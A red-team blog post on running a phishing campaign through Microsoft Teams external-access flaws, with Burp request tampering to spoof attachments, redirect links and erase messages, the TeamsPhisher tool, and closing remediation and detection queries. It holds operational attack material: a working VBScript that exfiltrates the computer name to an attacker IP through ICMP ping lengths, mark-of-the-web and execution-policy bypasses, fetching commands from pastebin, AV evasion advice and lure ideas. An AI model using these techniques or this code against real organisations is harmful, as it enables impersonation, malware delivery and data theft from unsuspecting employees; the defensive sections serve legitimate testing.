---
layout: post
title: 30/07/2023 Phishing on Microsoft Teams + general considerations
category: phishing
---

Implementation of a phishing campaign through known Microsoft Teams vulnerabilities with automation tools and manual exploitation

---

## DISCLAIMER

> This material is for educational and research purposes only. Do not attempt to violate the law with any of the material contained here. Do not use this information maliciously. I can not be held responsible for any error or negligence derived therefrom, use at your own risk.


## Summary

The tests aim to exploit known flaws of Microsoft Teams discovered by Max Corbridge and Tom Ellson that allows an external user to contact an internal user or a list of users within the organization through group chat.

The phishing attempt is facilitated also by the feature of Microsoft Teams that format Share Point links as they were files directly sent in the conversation.

The Attacker can impersonate someone inside the organization just by knowing first name and last name, the picture of the account will be automatically generated with the initials; the phone notifications have no evidence that the message is coming from someone outside the organization.

The Group chat has a visible icon that shows that its not a 1 to 1 conversation and inside it its visible that the message is sent by an external user anyway the group chat name will be changed to the one of the sender.

The final considerations will be about the development of payloads/techniques that allows the attacker to understand if the campaign was successful + small considerations about AV/EDR evasion. 

#### Requirements:
- Microsoft Business subscription ([Free Trial Available](https://www.microsoft.com/en-ww/microsoft-365/microsoft-365-business-standard-one-month-trial?market=af)) with Share Point and Microsoft Teams ready to use.
- target email

The tools used are: 
- [TeamPhisher](https://github.com/Octoberfest7/TeamsPhisher) (automation)
- [Burp Suite](https://portswigger.net/burp) (manual)

#### Objectives:
- Verify the exploitability of this flaws and estimate the success that they would have in a real campaign
- Internal training
- Implement new security features to deny this flaws (Remediation plan)
  
---

## Data and tests

### General Info

Using the azure domain free its possible to setup a custom domain like the one we used ```REDACTED.onmicrosoft.com``` and a user like  
```REDACTED@REDACTED.onmicrosoft.com``` ( create something that blends more with the org that you are trying to infiltrate :] like Helpdesk ICT with a similar domain), the cost of this procedure is 1$.

Defender AV and Microsoft EDR were present in the testing environment (victim machine).

### Manual Tests

Testing of the following  Microsoft Teams flaws/vulnerabilities:

1. verify if its possible to know if a user has external communication enabled
2. verify if its possible to add a user to a group chat and send messages, verify that the user saw the message
3. verify if its possible to send a message to a group chat and when intercepted you can add an attachment
4. verify if its possible to send a message + attachment to a group chat and tamper the file extension/name
5. verify if its possible to spoof links so that it forwards to a malicious site/file
6. verify if its possible to tamper the chat with client messageID's, eliminating proofs of edit and messages
7. verify if its possible to remove some IOC such as the external tag when the group chat is created 

#### 1.  user has external communication enabled

```New chat > To: > insert email > search externally > if the external contact is enabled the user will be found```

![External Communication](/images/contactexternal.PNG)


#### 2. add an external user to a group chat and send messages bypassing the block with message seen verification


``` New chat > To: > insert email of the user 2 times > insert a name for the group > send the message```

![groupcreation.png](/images/groupcreation.PNG)
![messagegroup.png](/images/messagegroup.PNG)

message seen by the victim.

![messageread.png](/images/messageread.PNG)

block if the message is directly sent to the victim.

![directmessage.png](/images/directmessage.PNG)

#### 3. send a message to a group chat with the victim and when intercepted you can add an attachment

Executing the same steps of point number 2 we can intercept the POST request that its sent with the message and add the file string to the body to the already sent message, why is that even useful?
Because we cant always send attachments directly from the GUI interface as there isn't always the proper icon.

**POC**

post request modified.

![burp1mod.png](/images/burp1mod.png)

to retrieve the files variables that are censored we can send the same file to a user trough the GUI and intercept the body with burpsuite.

missing attachment icon.

![attachment_icon.png](/images/attachment_icon.PNG)

#### 4.  send a message + attachment to a group chat and tamper the file extension/name

following the steps of point 3 we can modify the type and title tags in the file string part.
Changing the type will render the file with the image of that extension type (in this case word) and changing the title will change the name of the file shown in the chat.

**POC**

changes made.

![file_tampering.png](/images/file_tampering.PNG)

results.

![file_tampering2.png](/images/file_tampering2.PNG)

**Note:** its also possible to change the shareUrl to redirect the victim to a different file or to a completely different site.


#### 5. spoof links so that it forwards to a malicious site/file

following the steps of point 4 we can modify another part of the file string like the ShareUrl to redirect the victim wherever we like.

**POC**

victim pov.

![[link spoofing.png]](/images/link_spoofing.png)

**Note:** the victim can see the malicious ShareUrl so it can be easy to detect, but if we redirect it to another sharepoint file it might not be that obvious that the file name/extension changed.

#### 6. Tamper the chat with client messageID's

It's possible to modify a Microsoft Teams chat through the tampering of client message id's, this vuln enable the attacker to delete IOC and history of messages sent by knowing the client message id of a previous message sent.

**POC**

attacker sends the message and intercepts the client message ID
 
![messageid.png](/images/messageid.PNG)

Victim POV

![messageid2.png](/images/messageid2.PNG)

the attacker tampers the message by resending a message with the same client message id

![messageid3.png](/images/messageid3.PNG)

Victim POV

![messageid5.png](/images/messageid5.PNG)

**Note:** the new message will have the OriginalTimeArrived different from the original message so it will be sent after as a new message and the previous message will be deleted as it never existed in the sequence of messages
To be confirmed from Microsoft Teams admin center.


#### 7.  remove some IOC such as the external tag when the group chat is created 

Unfortunately, this vulnerability from [Manual bugs/exploitations](https://posts.inthecyber.com/leveraging-microsoft-teams-for-initial-access-42beb07f12c4) is patched and as of today there isn't something that is effective as this was.

*broken result*

![external_fail.png](/images/external_fail.PNG)

it's also possible to modify the username of the attacking user in Azure using some unicode emojis to try to move the external text or to make it more similar with the warning text its possible to use something like `Helpdesk (internal) &`.

#### Ideas

During the manual tests phase I encountered something very interesting like this orgid.

![orgid.PNG](/images/orgid.PNG)

The second orgid is the ObjectID of my victim user in the Active Directory that is transmitted as clear text, I believe that with more testing and modifying of the request it could be possible to impersonate a user inside an organization with an already known user.
As just changing the orgid with a known one inside the org doesn't work and the message isn't sent probably because of the too many ID's and controls that are hidden.

It is also shown an EndpointID with a status like active or Inactive that represents what I think is the status of the sender.

There are some gzip encoded requests that when decoded (use burp decoder or cyberchef) shows telemetry parameters and error logs but nothing that I found useful for our purpose.

Here are some of the possible attack chains that we suppose to use in our testing environment , this is just an example an not enough articulated to describe every aspect of the attack but it's a general idea of how to carry on the phishing attempt.

#### Possible Attack chains and payload considerations

![attack chain.png](/images/attackchain.png)

In this phishing campaign we are interested only in detecting the success of our attack attempts and in identifying the phished users.
So the objectives will be to detect if the users effectively click a phishing link that redirects to a fake microsoft login page (tracked with custom urls per user) or if they download and execute the malicious file.

With that being said after further testing I believe that the best options for the payload are a Zip archive (more interesting info [here](https://breakdev.org/zip-motw-bug-analysis/)) that can contain a .lnk file (more info on .lnk file exploitation [here](https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence)) that executes a hidden script in VBS or PS (Macros are now disabled by default on windows :().

Sending the script directly as a .lnk or .ps1/.vbs and tamper the file extension on teams is a possibility, but the user can detect it easily looking at what he is effectively downloading + MOTW alerts.

I then discovered while digging into stack overflow that browsers like Chrome have implemented security features for .lnk files adding the .DOWNLOAD extension and preventing the direct execution if not renamed.

```
if (IsShellIntegratedExtension(extension))  extension = kDefaultExtension; //<--"download" 
```

where `IsShellIntegratedExtension` returns true for `lnk` extensions:

```
if ((extension_lower == FILE_PATH_LITERAL("local")) ||    (extension_lower == FILE_PATH_LITERAL("lnk")))  return true; 
```


The delivery of the payload encounter two obstacles that can prevent the user from falling into the trap: the first one is MOTW (mark of the web) that prevent the user from executing the file by raising a suspicious smart-screen blue pop-up that re-asks the user if he really wants to open the file.
To bypass this we can use ISO/VHD containers or 7zip files (default options in the 7zip applications have MOTW disabled for the childs inside the archive) that once extracted won't have the MOTW.
If we are in a C2 situation we can nest the powershell commands under trusted utilities/applications like SyncAppvPublishingServer.exe or conhost.exe to download and run commands remotely, find more [here](https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/) (this can trigger EDR).

![EDR trigger](/images/EDR_trigge.png)

The second one would be the Execution Policies of Powershell, as Default that should have the value of "remote signed". During the testing phase this policy didnt prevent the execution of the script on WIN10, as it was a normal ping command, but they did on WIN11 and you can encounter more blocks if you try to execute different commands.
Fortunately to bypass execution policy we have scheduled tasks that can be used with the Invoke-WebRequest to call commands directly from pastebin.

Do not try to convert directly the vbs script to exe as AV/EDR will detect it very easily the only way is to create a custom wrapper that allows the execution of the code.

Possible file ideas to trick the user:
- meeting launcher
- sensitive information inside a zip protected with password
- receipts or financial data disguised as PDFs

###### Data Exfiltration

The data exfiltration technique used was ICMP Tunneling and the whole idea of the ping length was taken from [Rocco Sicilia](https://roccosicilia.com/2023/04/27/icmp-infostealing-il-lab-prima-parte/) work.
This kind of script was done because on windows we can't insert messages directly into the ping command as it is on Linux.

```
Dim ip
ip = ""

  
Dim MY_DATA
MY_DATA = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%")

  
Dim bytes
bytes = StrToByteArray(MY_DATA)

  
Dim base64string
base64string = CustomBase64Encode(bytes)

'WScript.Echo base64string

Dim shell, pingCmd, i
Set shell = CreateObject("WScript.Shell")


pingCmd = "ping -n 1 -l 1 " & ip

shell.Run pingCmd, 0, True

  
For i = 1 To Len(base64string)
    Dim x
    x = AscW(Mid(base64string, i, 1))
    Dim dataBuffer
    ReDim dataBuffer(x - 1)
    pingCmd = "ping -n 1 -l " & x & " " & ip
    shell.Run pingCmd, 0, True
    WScript.Sleep 100

Next


Function CustomBase64Encode(bytes)
    Dim base64Chars, padding
    base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    padding = "="

    Dim dataLength, outLength, p1, p2, p3
    dataLength = UBound(bytes) - LBound(bytes) + 1
    outLength = 4 * ((dataLength + 2) \ 3)

    Dim output, ipos, opos, a
    ReDim output(outLength - 1)

    ipos = 0
    opos = 0

    Do While ipos < dataLength

        p1 = bytes(ipos)
        ipos = ipos + 1
        a = a Or (p1 And 255)


        If ipos < dataLength Then
            p2 = bytes(ipos)
            ipos = ipos + 1
            a = a * 256 + (p2 And 255)
        Else
            p2 = 0
            a = a * 256
        End If

        If ipos < dataLength Then
            p3 = bytes(ipos)
            ipos = ipos + 1
            a = a * 256 + (p3 And 255)
        Else
            p3 = 0
            a = a * 256
        End If

        output(opos) = Mid(base64Chars, (a \ 262144) + 1, 1)
        opos = opos + 1

        output(opos) = Mid(base64Chars, ((a \ 4096) And 63) + 1, 1)
        opos = opos + 1

        output(opos) = Mid(base64Chars, ((a \ 64) And 63) + 1, 1)
        opos = opos + 1

        output(opos) = Mid(base64Chars, (a And 63) + 1, 1)
        opos = opos + 1

        a = 0
    Loop

    If dataLength Mod 3 = 1 Then
        output(opos - 2) = padding
    ElseIf dataLength Mod 3 = 2 Then
        output(opos - 1) = padding
    End If

    CustomBase64Encode = Join(output, "")
End Function


Function StrToByteArray(str)
    Dim i, byteArray()
    ReDim byteArray(Len(str) - 1)

    For i = 1 To Len(str)
        byteArray(i - 1) = AscB(Mid(str, i, 1))
    Next

    StrToByteArray = byteArray

End Function
```

The end goal of this script is to extract the computer name  (to identify who got phished) and encode it to Base64 then take every letter and it's ASCII value, the ASCII value will then be inserted inside the ping command as the length of the data section of the ping.
On the attacker machine we will have a program taking the length of the data and coverting it to the original message.

---

### Automation Tests using TeamPhisher

we installed the following packages with pip ```
pip3 install msal```
```pip3 install colorama ```

Using the account associated with the Microsoft business license it is possible to insert a list of targets(targets.txt), a message(message.txt) and the malicious file as an attachment(bilancio.zip).

**POC**

```shell
python3 teamsphisher.py -u [REDACTED].onmicrosoft.com -p '[REDACTED]' -l targets.txt -a /home/kali/Desktop/bilancio.zip -m message.txt --log
```

2. This is the **attacker Teams pov**:

*Teams on browser*

![pov sender 1.png](/images/pov_sender_1.png)
![pov sender 2.png](/images/pov_sender_2.png)

3. This is the **victim Teams pov** with notifications:

*phone notification*

![victim pov phone notification.jpeg](/images/victim_pov_phone_notification.jpeg)

*desktop notification*

![notifica desktop.png](/images/notifica_desktop.png)

*Teams App*

![pov receiver 1.png](/images/pov_receiver_1.png)
![pov receiver 2.png](/images/pov_receiver_2.png)

To personalize the code of the message there is an automatic greetings that's customizable or it can be turned off with the ```--nogreeting ``` option.

*Code*
```python
## Global Options and Variables ##

# Greeting: The greeting to use in messages sent to targets. Will be joined with the targets name if the --personalize flag is used

# Examples: "Hi" "Good Morning" "Greetings"

Greeting = "Salve"

# useragent: The useragent string to use for web requests

useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
```

It is also possible to customize the header of the request that will be sent.

*Code*
```python
body = """{

"content": "%s",

"messagetype": "RichText/Html",

"contenttype": "text",

"amsreferences": [],

"clientmessageid": "3529890327684204137",

"imdisplayname": "Federico Lorenzon",

"properties": {

"files": "[{\\"@type\\":\\"http://schema.skype.com/File\\",\\"version\\":2,\\"id\\":\\"%s\\",\\"baseUrl\\":\\"%s/personal/%s/\\",\\"type\\":\\"%s\\",\\"title\\":\\"%s\\",\\"state\\":\\"active\\",\\"objectUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"providerData\\":\\"\\",\\"itemid\\":\\"%s\\",\\"fileName\\":\\"%s\\",\\"fileType\\":\\"%s\\",\\"fileInfo\\":{\\"itemId\\":null,\\"fileUrl\\":\\"%s/personal/%s/Documents/Microsoft%%20Teams%%20Chat%%20Files/%s\\",\\"siteUrl\\":\\"https://teamphisher-my.sharepoint.com/personal/phisher_teamphisher_onmicrosoft_com/\\",\\"serverRelativeUrl\\":\\"\\",\\"shareUrl\\":\\"%s\\",\\"shareId\\":\\"%s\\"},\\"botFileProperties\\":{},\\"permissionScope\\":\\"anonymous\\",\\"filePreview\\":{},\\"fileChicletState\\":{\\"serviceName\\":\\"p2p\\",\\"state\\":\\"active\\"}}]",

"importance": "",

"subject": ""

}

}""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
```

more features and customization are available on the [github page](https://github.com/Octoberfest7/TeamsPhisher) of the tool.

**ERRORS ON THE WAY**

1. [# Error sending message + attachment to user: 500](https://github.com/Octoberfest7/TeamsPhisher/issues/3)

The error was related with the formatting of the message and the use of special characters

![error 500.png](/images/error_500.png)

2.  [GitHub issue 1](https://github.com/Octoberfest7/TeamsPhisher/issues/3)

3. [GitHub issue 2](https://github.com/Octoberfest7/TeamsPhisher/issues/11)

## Conclusions

This actions heavily relay on the flaws of Microsoft Teams and the trust that the employees might have towards a product like this as it can be seen as a native extension of the communications inside an organization.
Smart working can also be a small cause in the success of a campaign like this as missing human interactions influence and increase the value of chatting products within and outside organizations.

Microsoft has replied to the team that discovered this vulnerability that it has no priority on their schedule and is considered as social engineering as it heavily relay on the human factor , so they wont fix it, hopefully this will change in the future.

To remediate this we have different options:
1. if the organization doesn't need to communicate with external tenants you can disable the option to receive messages from externals in Microsoft Teams Admin Center > External Access, this solution will solve the problem completely.
2. if the organization needs to communicate with externals but they have known domains you can whitelist them in Microsoft Teams Admin Center > External Access.
3. Implement Cloud Apps activity policies to monitor external users and their activities inside your organization (maybe also on other services)
4. Staff/employees Education.

To detect this kind of attacks the only solution is custom detection rules and queries through sentinel and defender (as of today this queries could not be tested) this two were provided by Steven Lim [here](https://www.linkedin.com/pulse/defending-against-teamsphisher-attack-microsoft-365-defender-lim?utm_source=share&utm_medium=member_ios&utm_campaign=share_via)

UPDATE:: It seems that external messages aren't collected from defender/purview/sentinel, that would prevent completely the manual detection with custom queries, this is a possible configuration mistake on data connectors from my side.
I leave the queries below just for reference and for further personal study.

**Microsoft Sentinel possible query**

```
OfficeActivity
| where TimeGenerated > ago(1h)
| where RecordType =~ "MicrosoftTeams"
| where Operation == "MessageCreatedHasLink"
| where CommunicationType == CommunicationType == "GroupChat"
| where UserId !endswith "" and  UserId !endswith "" 
| extend UserDomains = tostring(split(UserId, '@')[1])
| extend UserIPs = tostring(split(ClientIP, '::ffff:')[1])
| where UserIPs != ""
| distinct UserIPs
| join ThreatIntelligenceIndicator on $left.UserIPs == $right.NetworkIP
```

**Microsoft Defender 365**

```
CloudAppEvents  
| where Timestamp > ago(30d)  
| where Application contains "Microsoft Teams"  
| where ActionType == "MessageCreatedHasLink"  
| where AccountId contains "@"  
| extend ExtUserDomain = tostring(split(AccountId, '@')[1])  
| extend CommunicationType=tostring(RawEventData.CommunicationType)  
| extend ClientIP=tostring(RawEventData.ClientIP)  
| extend ExtUserIP = tostring(split(ClientIP, '::ffff:')[1])  
| extend MsgURL=tostring(RawEventData.MessageURLs)  
| extend TeamsMsgURL=substring(MsgURL, 2, strlen(MsgURL)-4)  
| where CommunicationType == "OneOnOne" or CommunicationType == "GroupChat"  
| sort by Timestamp desc  
| project Timestamp, ExtUserDomain, AccountId, ExtUserIP, IPAddress, IsAnonymousProxy, CountryCode, City, ISP, IPTags, IPCategory, RawEventData, TeamsMsgURL  
| join UrlClickEvents on $left.TeamsMsgURL == $right.Url  
| where Workload == "Teams"
```

## Bibliography/Credits

- [Teams Official disclose Research](https://labs.jumpsec.com/advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/)

- [Manual bugs/exploitations](https://posts.inthecyber.com/leveraging-microsoft-teams-for-initial-access-42beb07f12c4)

- [Basic tool](https://github.com/sse-secure-systems/TeamsEnum)

- [audit logs in microsoft teams](https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide)

- [Guide3](https://badoption.eu/blog/2023/06/30/teams3.html)

- [Guide2](https://badoption.eu/blog/2023/06/22/teams2.html)

- [queries article](https://www.linkedin.com/pulse/defending-against-teamsphisher-attack-microsoft-365-defender-lim?utm_source=share&utm_medium=member_ios&utm_campaign=share_via)

- [lolbas](https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/)

- [MOTW bypass](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)

- [MOTW bypass on zip](https://breakdev.org/zip-motw-bug-analysis/)

- [abusing lnk](https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence)

- [Useful Red Team Info ITA](https://roccosicilia.com/)

+other articles that i cant remember









```EDIT 31/07: typo corrections```

```EDIT 02/08: disclaimer add```

